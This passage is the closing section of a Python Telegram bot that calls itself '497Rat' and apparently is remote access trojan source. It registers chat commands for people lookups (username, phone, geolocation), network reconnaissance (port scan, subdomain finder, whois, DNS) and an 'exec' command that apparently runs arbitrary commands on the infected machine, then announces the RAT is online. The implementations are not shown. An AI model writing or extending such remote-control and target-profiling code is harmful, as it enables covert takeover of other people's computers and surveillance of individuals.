    app.add_handler(CommandHandler("username", username_search))
    app.add_handler(CommandHandler("phone", phone_lookup))
    app.add_handler(CommandHandler("domain", domain_info))
    app.add_handler(CommandHandler("dns", dns_lookup))
    app.add_handler(CommandHandler("whois", whois))
    app.add_handler(CommandHandler("hash", hash_lookup))
    app.add_handler(CommandHandler("mac", mac_lookup))
    app.add_handler(CommandHandler("portscan", portscan))
    app.add_handler(CommandHandler("subdomain", subdomain_finder))
    app.add_handler(CommandHandler("headers", headers))
    app.add_handler(CommandHandler("sslinfo", sslinfo))
    app.add_handler(CommandHandler("geo", geo))

    app.add_handler(CommandHandler("clear", clear_console))
    app.add_handler(CommandHandler("exec", execute_cmd))
    
    print("497Rat is ONLINE")
    print("Send /start to your bot")
    
    app.run_polling()

if __name__ == "__main__":
    main()
